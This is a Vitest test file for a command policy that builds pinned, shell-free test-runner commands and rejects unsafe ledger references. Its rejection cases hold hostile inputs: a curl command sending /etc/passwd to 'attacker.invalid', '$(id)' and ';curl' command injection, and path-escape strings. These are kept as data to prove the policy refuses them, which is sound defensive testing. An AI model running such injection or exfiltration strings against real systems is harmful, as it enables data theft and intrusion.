import { join } from 'node:path';
import { mkdtempSync,writeFileSync,readFileSync,rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { createHash } from 'node:crypto';
import { spawn,execFileSync } from 'node:child_process';
import { createAssertionExecutor } from '../gp-assertion-process.js';
import { createToolchainAttestation } from '../gp-assertion-toolchain.js';
import { describe, expect, it, vi } from 'vitest';
import {
  assertionCommand, canonicalAssertionArgv, canonicalAssertionCommandText,
  canonicalRepoIdentity, classifyAssertionRef, defaultTrackedPath,
} from '../gp-assertion-command.js';

const ROOT = '/repo';
const PACKAGE = join(ROOT, 'packages/brain');
const SHA = `sha256:${'a'.repeat(64)}`;
const TOOLS = {
  node: { path: '/tools/node-link', sha256: SHA },
  vitest: { path: join(ROOT, 'node_modules/.bin/vitest'), sha256: SHA },
  python: { path: '/tools/python3', sha256: SHA },
  bash: { path: '/bin/bash', sha256: SHA },
};
const REAL = {
  '/tools/node-link': '/tools/node-real',
  [join(ROOT, 'node_modules/.bin/vitest')]:
    join(ROOT, 'node_modules/vitest/vitest.mjs'),
};
const deps = {
  toolchains: TOOLS,
  realpathFn: vi.fn(async path => REAL[path] ?? path),
  fileStatFn: vi.fn(async () => ({ isFile: () => true })),
  pathExistsFn: vi.fn(async path => path === join(PACKAGE, 'package.json')),
  isTrackedPathFn: vi.fn(async () => true),
};

it('明确manual Node test保留独立canonical协议，裸test路径仍Vitest',()=>{
 const ref='manual:node --test scripts/ci/__tests__/caller.test.mjs';
 expect(classifyAssertionRef(ref)).toEqual({kind:'node',path:'scripts/ci/__tests__/caller.test.mjs'});
 expect(canonicalAssertionCommandText(ref)).toBe('node --test scripts/ci/__tests__/caller.test.mjs');
 expect(canonicalAssertionArgv(ref)).toEqual(['node','--test','scripts/ci/__tests__/caller.test.mjs']);
 expect(classifyAssertionRef('scripts/ci/__tests__/caller.test.mjs').kind).toBe('vitest');
});
it.each(['manual:node scripts/run.js','manual:node --test scripts/run.js','manual:node --test --import evil.mjs test.test.mjs','manual:node --test a.test.mjs b.test.mjs','manual:node --test ../evil.test.mjs','manual:node --test test.test.mjs;curl bad','manual:node --test $(id).test.mjs'])('Node精确协议拒绝任意脚本、flags或shell：%s',ref=>{
 expect(()=>canonicalAssertionArgv(ref)).toThrow();
});
it.each([false,true])('固定真实Node子进程产生真PASS/FAIL和场景计数，保toolchain锁与WeakSet：fail=%s',async fail=>{
 const root=mkdtempSync(join(tmpdir(),'gp-node-assertion-'));
 try{
  writeFileSync(join(root,'actual.test.mjs'),`import {test} from 'node:test';test('real child',()=>{${fail?"throw Error('actual failure');":""}});`);
  execFileSync('git',['init','-q'],{cwd:root});execFileSync('git',['add','.'],{cwd:root});
  const nodeSha=`sha256:${createHash('sha256').update(readFileSync(process.execPath)).digest('hex')}`;
  const command=await assertionCommand('manual:node --test actual.test.mjs',root,{toolchains:{node:{path:process.execPath,sha256:nodeSha}}});
  expect(command.options).toMatchObject({shell:false,evidenceKind:'node',env:{inherit:false,allowlist:[]}});
  expect(command.options.toolchain).toHaveLength(1);
  const attestation=await createToolchainAttestation({command,actual_runner_digest:SHA,expected_runner_digest:SHA});
  expect(attestation.files[0].sha256).toBe(nodeSha);
  await expect(createToolchainAttestation({command:{...command},actual_runner_digest:SHA,expected_runner_digest:SHA})).rejects.toMatchObject({code:'ASSERTION_COMMAND_UNTRUSTED'});
  const result=await createAssertionExecutor({spawnFn:spawn,environment:{LANG:'C'},timeoutMs:10000})(command.executable,command.argv,command.options);
  expect(result.exitCode===0).toBe(!fail);expect(result.scenarioCount).toBe(1);
  expect(result.scenarioEvidence).toMatchObject({kind:'node',passed:fail?0:1,failed:fail?1:0});
  const bad=await assertionCommand('manual:node --test actual.test.mjs',root,{toolchains:{node:{path:process.execPath,sha256:`sha256:${'f'.repeat(64)}`}}});
  await expect(createToolchainAttestation({command:bad,actual_runner_digest:SHA,expected_runner_digest:SHA})).rejects.toMatchObject({code:'ASSERTION_TOOLCHAIN_DIGEST_MISMATCH'});
 }finally{rmSync(root,{recursive:true,force:true});}
},20000);

describe('trusted GP assertion command policy', () => {
  it.each([
    ['packages/brain/src/example.test.js',
      'npx vitest run packages/brain/src/example.test.js'],
    ['manual:python3 -m pytest services/tests/test_gp.py',
      'python3 -m pytest services/tests/test_gp.py'],
    ['scripts/smoke/gp.sh', 'bash scripts/smoke/gp.sh'],
  ])('derives canonical ledger command for %s', (ref, expected) => {
    expect(canonicalAssertionCommandText(ref)).toBe(expected);
  });

  it.each([
    ['packages/brain/src/example.test.js',
      ['npx', 'vitest', 'run', 'packages/brain/src/example.test.js']],
    ['manual:python3 -m pytest services/tests/test_gp.py',
      ['python3', '-m', 'pytest', 'services/tests/test_gp.py']],
    ['scripts/smoke/gp.sh', ['bash', 'scripts/smoke/gp.sh']],
  ])('derives shell-free receipt argv for %s', (ref, expected) => {
    expect(canonicalAssertionArgv(ref)).toEqual(expected);
  });

  it.each([
    'manual:curl https://attacker.invalid/exfil --data @/etc/passwd',
    'manual:true',
    'packages/brain/src/$(id).test.js',
    '../evil.test.js',
    'packages/brain/-c.test.js',
  ])('never upgrades unsafe ledger text into shell: %s', ref => {
    expect(() => canonicalAssertionCommandText(ref))
      .toThrow(expect.objectContaining({ code: expect.stringMatching(/^UNSAFE_|ASSERTION_/) }));
  });

  it.each([
    ['packages/brain/src/example.test.js', '/tools/node-real',
      [join(ROOT, 'node_modules/vitest/vitest.mjs'), 'run', './src/example.test.js', '--'],
      PACKAGE, 'vitest', ['node', 'vitest']],
    ['scripts/smoke/gp.sh', '/bin/bash',
      [join(ROOT, 'scripts/smoke/gp.sh')], ROOT, 'bash', ['bash']],
    ['services/tests/test_gp.py', '/tools/python3',
      ['-m', 'pytest', '--', 'services/tests/test_gp.py'],
      ROOT, 'pytest', ['python']],
  ])('builds a pinned positional %s command', async (
    ref, executable, argv, cwd, kind, toolNames,
  ) => {
    const command = await assertionCommand(ref, ROOT, deps);
    expect(command).toMatchObject({
      executable, argv,
      options: {
        cwd, shell: false, evidenceKind: kind,
        env: { inherit: false, allowlist: [] },
      },
    });
    expect(command.options.toolchain.map(({ name, path }) => ({ name, path })))
      .toEqual(toolNames.map(name => ({
        name,
        path: REAL[TOOLS[name].path] ?? TOOLS[name].path,
      })));
  });

  it.each([
    'packages/brain/--config=src/evil.test.js',
    'packages/brain/--pool=forks.test.js',
  ])('keeps option-shaped target positional: %s', async ref => {
    const command = await assertionCommand(ref, ROOT, deps);
    expect(command.argv.at(-2)).toBe(`./${ref.slice('packages/brain/'.length)}`);
    expect(command.argv.at(-1)).toBe('--');
  });

  it('executes the same canonical paths recorded in the toolchain', async () => {
    const command = await assertionCommand(
      'packages/brain/src/example.test.js', ROOT, deps,
    );
    expect(command.executable).toBe('/tools/node-real');
    expect(command.argv[0]).toBe(join(ROOT, 'node_modules/vitest/vitest.mjs'));
    expect(command.options.toolchain.map(item => item.path))
      .toEqual([command.executable, command.argv[0]]);
  });

  it.each([
    [undefined, 'ASSERTION_TOOLCHAIN_REQUIRED'],
    [{ ...TOOLS, python: { path: 'python3', sha256: SHA } },
      'ASSERTION_TOOLCHAIN_PATH_INVALID'],
    [{ ...TOOLS, bash: { path: '/bin/bash', sha256: 'latest' } },
      'ASSERTION_TOOLCHAIN_DIGEST_INVALID'],
  ])('fails closed for unsafe toolchain %#', async (toolchains, code) => {
    await expect(assertionCommand('services/tests/test_gp.py', ROOT, {
      ...deps, toolchains,
    })).rejects.toMatchObject({ code });
  });

  it('does not accept caller environment values', async () => {
    const command = await assertionCommand('scripts/smoke/gp.sh', ROOT, {
      ...deps,
      env: { PATH: '/attacker', DATABASE_URL: 'secret' },
    });
    expect(command.options.env).toEqual({ inherit: false, allowlist: [] });
    expect(JSON.stringify(command)).not.toContain('secret');
    expect(JSON.stringify(command)).not.toContain('/attacker');
  });

  it.each(['&&', ';', '|', '`id`', '$(id)', '"quoted"'])(
    'rejects shell syntax %s',
    async token => {
      await expect(assertionCommand(
        `manual:npx vitest run packages/brain/src/example.test.js ${token}`,
        ROOT,
        deps,
      )).rejects.toMatchObject({ code: 'UNSAFE_ASSERTION_COMMAND' });
    },
  );

  it.each(['/tmp/evil.test.js', '../evil.test.js'])(
    'rejects path escape %s',
    async ref => {
      await expect(assertionCommand(ref, ROOT, deps))
        .rejects.toMatchObject({ code: 'ASSERTION_PATH_ESCAPE' });
    },
  );

  it('rejects symlink escape and untracked canonical targets', async () => {
    const escaped = {
      ...deps,
      realpathFn: vi.fn(async path => (
        path === ROOT ? ROOT : '/outside/evil.test.js'
      )),
    };
    await expect(assertionCommand(
      'packages/brain/src/example.test.js', ROOT, escaped,
    )).rejects.toMatchObject({ code: 'ASSERTION_PATH_ESCAPE' });
    await expect(assertionCommand('packages/brain/src/example.test.js', ROOT, {
      ...deps, isTrackedPathFn: vi.fn(async () => false),
    })).rejects.toMatchObject({ code: 'ASSERTION_PATH_UNTRACKED' });
  });

  it('rejects a symlink whose canonical target changes assertion type', async () => {
    await expect(assertionCommand('scripts/smoke/gp.sh', ROOT, {
      ...deps,
      realpathFn: vi.fn(async path => (
        path.endsWith('/scripts/smoke/gp.sh') ? join(PACKAGE, 'package.json') : path
      )),
    })).rejects.toMatchObject({ code: 'ASSERTION_PATH_TYPE_MISMATCH' });
  });

  it('rejects a non-string toolchain digest despite string coercion', async () => {
    const sha256 = { toString: () => SHA };
    await expect(assertionCommand('services/tests/test_gp.py', ROOT, {
      ...deps, toolchains: { ...TOOLS, python: { path: '/tools/python3', sha256 } },
    })).rejects.toMatchObject({ code: 'ASSERTION_TOOLCHAIN_DIGEST_INVALID' });
  });

  it('rejects tracked directory prefixes', async () => {
    expect(await defaultTrackedPath(process.cwd(), join(process.cwd(), 'src'))).toBe(false);
  });

  it('rejects canonical directories', async () => {
    await expect(assertionCommand('packages/brain/suite.test.js', ROOT, {
      ...deps, fileStatFn: vi.fn(async () => ({ isFile: () => false })),
    })).rejects.toMatchObject({ code: 'ASSERTION_PATH_NOT_FILE' });
  });

  describe('probe:<key> 探针形状（决策 702949b6：注册表在 step_probes，执行体不是 shell）', () => {
    it('classify 认出 probe 形状并标 executor_kind=business_probe_runner', () => {
      expect(classifyAssertionRef('probe:delivery.leads_count')).toEqual({
        kind: 'probe', key: 'delivery.leads_count', keys: ['delivery.leads_count'],
        executor_kind: 'business_probe_runner',
      });
      expect(classifyAssertionRef('probe:delivery.leads_count,delivery.no_dup')).toEqual({
        kind: 'probe', key: 'delivery.leads_count,delivery.no_dup',
        keys: ['delivery.leads_count', 'delivery.no_dup'],
        executor_kind: 'business_probe_runner',
      });
      expect(classifyAssertionRef('packages/brain/src/example.test.js')).toEqual({
        kind: 'vitest', path: 'packages/brain/src/example.test.js',
      });
    });

    it.each(['probe:', 'probe:$(id)', 'probe:a b', 'probe:a,,b', 'probe:../x'])(
      'probe: 后接非法 key 拒收 %s', ref => {
        expect(() => classifyAssertionRef(ref))
          .toThrow(expect.objectContaining({ code: 'ASSERTION_PROBE_KEY_INVALID' }));
      },
    );

    it('canonical ledger 命令 / argv / 执行命令 对 probe 都显式拒绝：探针没有 shell 形态', async () => {
      const ref = 'probe:delivery.leads_count';
      expect(() => canonicalAssertionCommandText(ref))
        .toThrow(expect.objectContaining({ code: 'ASSERTION_PROBE_NOT_RUNNABLE' }));
      expect(() => canonicalAssertionArgv(ref))
        .toThrow(expect.objectContaining({ code: 'ASSERTION_PROBE_NOT_RUNNABLE' }));
      await expect(assertionCommand(ref, ROOT, deps))
        .rejects.toMatchObject({ code: 'ASSERTION_PROBE_NOT_RUNNABLE' });
    });
  });

  it.each([
    ['https://token@github.com/OpenAI/cecelia.git', 'github.com/OpenAI/cecelia'],
    ['git@GitHub.com:OpenAI/cecelia.git', 'github.com/OpenAI/cecelia'],
  ])('canonicalizes origin without credentials', (origin, expected) => {
    expect(canonicalRepoIdentity(origin)).toBe(expected);
  });
});
